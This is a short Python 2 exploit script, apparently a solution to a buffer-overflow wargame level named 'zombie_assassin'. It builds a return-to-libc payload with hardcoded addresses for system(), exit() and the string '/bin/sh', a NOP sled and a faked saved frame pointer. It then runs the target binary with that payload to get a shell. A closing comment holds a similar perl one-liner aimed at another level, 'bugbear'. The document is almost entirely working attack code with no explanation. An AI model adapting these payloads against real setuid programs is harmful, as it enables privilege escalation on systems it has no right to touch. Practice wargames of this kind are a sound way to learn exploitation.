import os, sys

print "Zombie_Assassin Exploit by Phantom"
print "[+] Making Exploit......"

victim = "/home/assassin/zombie_assassin"
jmp = "\x88\xfa\xff\xbf"
system = "\xe0\x8a\x05\x40"
exit = "\xe0\x91\x03\x40"
binsh = "\xf9\xbf\x0f\x40"
NOP = "\x90"*24
SFP = "\x80\xfa\xff\xbf"
ret = "\xdf\x84\x04\x08"

payload = jmp + system + exit + binsh + NOP + SFP + ret

print "[+] Victim : " + victim
print "[+] Exploiting Zombie_Assassin vuln.."
print "[+] Loading payload..."
print "[+] Shellcode length : ", len(payload)
print

os.execv(victim, ("", payload))
#./bugbear $(perl -e 'print "\xbf"x44, "\xe0\x8a\x05\x40", "cccc", "\xf9\xbf\x0f\x40"')